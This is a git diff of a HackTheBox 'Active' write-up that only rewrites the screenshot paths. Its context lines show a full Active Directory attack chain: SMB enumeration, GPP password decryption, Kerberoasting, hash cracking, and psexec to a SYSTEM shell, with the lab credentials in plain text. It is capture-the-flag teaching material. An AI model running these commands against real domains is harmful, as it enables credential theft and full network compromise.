@@ -42,7 +42,7 @@ To verify if the host is up and reachable, we send a single ICMP packet:
 ping -c 1 10.10.10.100
 ```
 
-![Ping](cases/HackTheBox/Machines/EASY/Active/screenshots/ping.png)
+![Ping](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -64,7 +64,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)
 - `-oG allPorts`: Output in grepable format for later processing
 
-![nmap](cases/HackTheBox/Machines/EASY/Active/screenshots/nmap.png)
+![nmap](screenshots/nmap.png)
 
 Alternative method using masscan and nmap:
 
@@ -84,7 +84,7 @@ After the scan, we extract the list of open ports using a custom script:
 extractPorts allPorts
 ```
 
-![extractPorts](cases/HackTheBox/Machines/EASY/Active/screenshots/extractPorts.png)
+![extractPorts](screenshots/extractPorts.png)
 
 ### 1.3 Targeted Scan
 
@@ -101,7 +101,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49
 - `-sV`: Detect service versions
 - `-oN`: Output results in a human-readable format
 
-![targeted](cases/HackTheBox/Machines/EASY/Blue/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 | Port   | Service         | Description                                 |
 | ------ | --------------- | ------------------------------------------- |
@@ -146,7 +146,7 @@ We also run CrackMapExec to get a quick overview:
 crackmapexec smb 10.10.10.100
 ```
 
-![crackmapexec](cases/HackTheBox/Machines/EASY/Active/screenshots/crackmapexec.png)
+![crackmapexec](screenshots/crackmapexec.png)
 
 Confirms the hostname and domain, indicating that we are indeed dealing with a DC.
 
@@ -158,7 +158,7 @@ We enumerate the available shares using unauthenticated access (null session):
 smbclient -L 10.10.10.100 -N
 ```
 
-![smbclient_null](cases/HackTheBox/Machines/EASY/Active/screenshots/smbclient_null.png)
+![smbclient_null](screenshots/smbclient_null.png)
 
 Several shares are listed, and public access is allowed to at least one of them.
 
@@ -170,7 +170,7 @@ We list available shares and their permissions using `smbmap`:
 smbmap -H 10.10.10.100
 ```
 
-![smbmap](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap.png)
+![smbmap](screenshots/smbmap.png)
 
 Access is granted only to the `Replication` share.
 
@@ -180,21 +180,21 @@ This indicates that we can read files inside the **SYSVOL** structure. We procee
 smbmap -H 10.10.10.100 -r Replication
 ```
 
-![smbmap_replication](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_replication.png)
+![smbmap_replication](screenshots/smbmap_replication.png)
 
 The structure closely resembles the typical **SYSVOL** directory used for GPO deployment in Active Directory environments.
 
-![smbmap_active](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_active.png)
+![smbmap_active](screenshots/smbmap_active.png)
 
-![smbmap_policies](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_policies.png)
+![smbmap_policies](screenshots/smbmap_policies.png)
 
-![smbmap_31b2f340](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_31b2f340.png)
+![smbmap_31b2f340](screenshots/smbmap_31b2f340.png)
 
-![smbmap_machine](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_machine.png)
+![smbmap_machine](screenshots/smbmap_machine.png)
 
-![smbmap_preferences](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_preferences.png)
+![smbmap_preferences](screenshots/smbmap_preferences.png)
 
-![smbmap_groups](cases/HackTheBox/Machines/EASY/Active/screenshots/smbmap_groups.png)
+![smbmap_groups](screenshots/smbmap_groups.png)
 
 We find `Group.xml`, this file often contains GPP credentials, which are encrypted with a known static key.
 
@@ -208,7 +208,7 @@ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D
 
 Let's rename and open it:
 
-![groups_xml](cases/HackTheBox/Machines/EASY/Active/screenshots/groups_xml.png)
+![groups_xml](screenshots/groups_xml.png)
 
 There are two interesting values:
 
@@ -223,7 +223,7 @@ We decrypt it using the `gpp-decrypt` tool:
 gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
 ```
 
-![svg_tgs_credentials](cases/HackTheBox/Machines/EASY/Active/screenshots/svg_tgs_credentials.png)
+![svg_tgs_credentials](screenshots/svg_tgs_credentials.png)
 
 **Credentials retrieved:**  
 Username: `SVC_TGS`  
@@ -237,7 +237,7 @@ We test the credentials with CrackMapExec:
 crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
 
-![crackmapexec_svg_tgs](cases/HackTheBox/Machines/EASY/Active/screenshots/crackmapexec_svg_tgs.png)
+![crackmapexec_svg_tgs](screenshots/crackmapexec_svg_tgs.png)
 
 Login successful â€” the credentials are valid.
 
@@ -249,7 +249,7 @@ With valid credentials, we enumerate shares again:
 crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
 ```
 
-![crackmapexec_svg_tgs_shares](cases/HackTheBox/Machines/EASY/Active/screenshots/crackmapexec_svg_tgs_shares.png)
+![crackmapexec_svg_tgs_shares](screenshots/crackmapexec_svg_tgs_shares.png)
 
 We identify access to the **Users** share. We list its contents:
 
@@ -257,7 +257,7 @@ We identify access to the **Users** share. We list its contents:
 smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop/
 ```
 
-![user_flag_desktop](cases/HackTheBox/Machines/EASY/Active/screenshots/user_flag_desktop.png)
+![user_flag_desktop](screenshots/user_flag_desktop.png)
 
 Inside, we find and download the user flag:
 
@@ -265,7 +265,7 @@ Inside, we find and download the user flag:
 smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
 ```
 
-![user_flag](cases/HackTheBox/Machines/EASY/Active/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 âœ… **User flag obtained**
 
@@ -291,7 +291,7 @@ We can use `rpcclient` to interact with the SMB RPC service and extract a list o
 rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomusers'
 ```
 
-![rpcclient_enumdomusers](cases/HackTheBox/Machines/EASY/Active/screenshots/rpcclient_enumdomusers.png)
+![rpcclient_enumdomusers](screenshots/rpcclient_enumdomusers.png)
 
 Lists all users in the domain along with their **RID** values.  
 This information can be useful for further password spraying, AS-REP Roasting, or targeted Kerberoasting.
@@ -304,7 +304,7 @@ Similarly, we enumerate all domain groups:
 rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomgroups'
 ```
 
-![rpcclient_enmdomgroups](cases/HackTheBox/Machines/EASY/Active/screenshots/rpcclient_enmdomgroups.png)
+![rpcclient_enmdomgroups](screenshots/rpcclient_enmdomgroups.png)
 
 Displays group names and RIDs.  
 Special attention should be given to administrative or privileged groups such as:
@@ -327,7 +327,7 @@ We attempt to enumerate and request service tickets using **Impacketâ€™s Ge
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
 ```
 
-![tgs_admin_user](cases/HackTheBox/Machines/EASY/Active/screenshots/tgs_admin_user.png)
+![tgs_admin_user](screenshots/tgs_admin_user.png)
 
 â— **Issue:** The command fails due to a **time synchronization mismatch** between our attacking machine and the Domain Controller.
 
@@ -342,16 +342,16 @@ sudo apt install ntpsec-ntpdate
 sudo ntpdate -u 10.10.10.100
 ```
 
-![ntpdate](cases/HackTheBox/Machines/EASY/Active/screenshots/ntpdate.png)
+![ntpdate](screenshots/ntpdate.png)
 
 After syncing time, we rerun the command:
 
-![getuser_spns](cases/HackTheBox/Machines/EASY/Active/screenshots/getuser_spns.png)
+![getuser_spns](screenshots/getuser_spns.png)
 
 We retrieve a **Ticket Granting Service (TGS)** hash for the **Administrator** account.
 We save the hash to a file named `hash`:
 
-![hash](cases/HackTheBox/Machines/EASY/Active/screenshots/hash.png)
+![hash](screenshots/hash.png)
 
 ### 3.5 Cracking the Hash
 
@@ -361,7 +361,7 @@ We crack the TGS hash offline using **John the Ripper** with the `rockyou.txt` w
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash
 ```
 
-![admin_credentials](cases/HackTheBox/Machines/EASY/Active/screenshots/admin_credentials.png)
+![admin_credentials](screenshots/admin_credentials.png)
 
 âœ… **Password found:**
 
@@ -376,7 +376,7 @@ We test the recovered credentials with CrackMapExec:
 crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
 ```
 
-![crackmapexec_admin](cases/HackTheBox/Machines/EASY/Active/screenshots/crackmapexec_admin.png)
+![crackmapexec_admin](screenshots/crackmapexec_admin.png)
 
 Administrator authentication successful â€” **full domain compromise achieved**.
 
@@ -415,7 +415,7 @@ Continue the attack chain with the next commands:
 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
 ```
 
-![psexec_admin_user](cases/HackTheBox/Machines/EASY/Active/screenshots/psexec_admin_user.png)
+![psexec_admin_user](screenshots/psexec_admin_user.png)
 
 A remote shell is obtained as `NT AUTHORITY\SYSTEM`.
 
